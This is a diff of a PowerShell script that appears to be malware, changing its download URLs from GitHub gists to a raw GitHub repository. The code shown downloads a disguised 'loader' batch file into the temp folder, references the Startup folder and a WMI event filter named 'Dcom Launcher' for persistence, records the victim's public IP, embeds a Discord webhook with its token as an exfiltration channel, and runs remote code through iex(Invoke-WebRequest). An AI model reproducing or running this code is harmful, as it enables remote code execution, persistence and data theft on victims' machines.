@@ -4,7 +4,7 @@ $startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Program
 $EventFilterName = 'Dcom Launcher';
 $load = "$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat";
 $uri = "https://discord.com/api/webhooks/981111472660828250/CWLcuIJJVB63kQ095YWTjGqR0aOOSmm8Tx8NePcB06OCiQVQc25jYmCQCTblGH9M3crS";
-$updater = "https://gist.githubusercontent.com/siliconmutex/efb7271724e331cf57e71643d443b645/raw/92ac92ec885d7b71275a6c201ca47e4ac4d1a3c2/update"
+$updater = "https://raw.githubusercontent.com/siliconmutex/rhino/main/update"
 
 try{
     $ip = (Invoke-WebRequest -uri "https://api.ipify.org/" -UseBasicParsing).Content 
@@ -41,7 +41,7 @@ try{
     $tem = $env:TEMP;
     $startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
     $wc = [System.Net.WebClient]::new();
-    $loader = "https://gist.githubusercontent.com/siliconmutex/50dd4f5a4331676e9aaa681923c0af11/raw/b0a1faea028cf07cac92344fa1d068c93007aa65/loader";
+    $loader = "https://raw.githubusercontent.com/siliconmutex/rhino/main/loader";
 
     $dll = "SystemUpdates....9hdmNxcUguHounsfIr72.bat"
     $wc.DownloadFile("$loader","$tem\$dll");
@@ -80,7 +80,7 @@ try {
             if ($a -ne $b){
                 if($cmd -Like "github") {
                     
-                    iex($call = Invoke-WebRequest -Uri https://gist.githubusercontent.com/siliconmutex/efb7271724e331cf57e71643d443b645/raw/a958347569cf7717259dee94aa0ae9ae512ecf2b/update -UseBasicParsing)
+                    iex($call = Invoke-WebRequest -Uri https://raw.githubusercontent.com/siliconmutex/rhino/main/update -UseBasicParsing)
                     }
 
                 try {
@@ -124,7 +124,7 @@ try {
         }elseif ($a -ne $b){
             if($b -Like "github") {
                     
-                iex($call = Invoke-WebRequest -Uri https://gist.githubusercontent.com/siliconmutex/efb7271724e331cf57e71643d443b645/raw/a958347569cf7717259dee94aa0ae9ae512ecf2b/update -UseBasicParsing)
+                iex($call = Invoke-WebRequest -Uri https://raw.githubusercontent.com/siliconmutex/rhino/main/update -UseBasicParsing)
             }
 
             try {
